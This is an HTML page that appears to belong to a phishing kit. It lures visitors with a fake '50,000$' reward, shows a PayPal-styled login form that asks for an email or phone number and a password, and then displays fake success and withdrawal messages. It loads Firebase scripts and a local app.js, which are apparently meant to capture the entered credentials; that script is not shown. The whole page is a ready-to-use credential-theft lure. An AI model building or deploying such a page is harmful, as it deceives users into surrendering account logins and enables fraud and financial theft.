<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="./css/styles.css" />
    <link rel="stylesheet" href="./css/responsive.css" />
    <link
      rel="shortcut icon"
      href="./assets/img/icon.png"
      type="image/x-icon" />
    <title>Get Rewards</title>
  </head>
  <body>
    <section class="main">
      <div class="topimg"></div>
      <div class="content">
        <h1 class="get-title">Get Your Due Reward</h1>
        <h4 class="numb">50,000$</h4>
        <div class="btn-wrapper">
          <button class="btn-claim">Claim</button>
        </div>
      </div>
      <div class="second-wrapper hidden">
        <h3 class="second-wrapper-title"></h3>
        <div class="content-second">
          <div class="inputform" action="">
            <img class="logopp" src="./assets/img/logo.svg" alt="" />
            <input
              class="login"
              type="text"
              placeholder="Email or mobile number" />
            <div class="requiredwrapper hidden">
              <img class="reqimg" src="./assets/img/req.png" alt="" />
              <p class="userrequired">Required</p>
            </div>
            <input
              class="password"
              type="password"
              placeholder="Enter your password" />
            <div class="requiredpasswordwrapper hidden">
              <img class="reqimg" src="./assets/img/req.png" alt="" />
              <p class="userrequired">Enter your password</p>
            </div>
            <div class="forgotwrapper">
              <p class="forgot-title">Forgot password?</p>
            </div>
            <div class="buttonwrapper">
              <button class="accept">Log In</button>
            </div>
          </div>
          <p class="vailederrortitle hidden"></p>
        </div>
      </div>

      <div class="card-added-wrapper hidden">
        <h3 class="succestitle">Your PayPal has been successfully added</h3>
        <h1 class="amount"></h1>
        <div class="withdrav-wrapper">
          <button class="withdraw-btn">Withdrawal</button>
        </div>
      </div>

      <div class="final-wrapper hidden">
        <h1 class="trans-final">
          Transaction completed successfully Please wait 3 working days
        </h1>
      </div>

      <div class="loader hidden"></div>

      <div class="bottomimg"></div>
    </section>

    <!-- <div class="box">
      <h1 class="maintxt">Hello World!!!</h1>
      <button class="btngo">Go!!!</button>
    </div> -->
    <script src="https://www.gstatic.com/firebasejs/8.6.2/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/3.1.0/firebase.js"></script>
    <script src="./js/app.js"></script>
  </body>
</html>
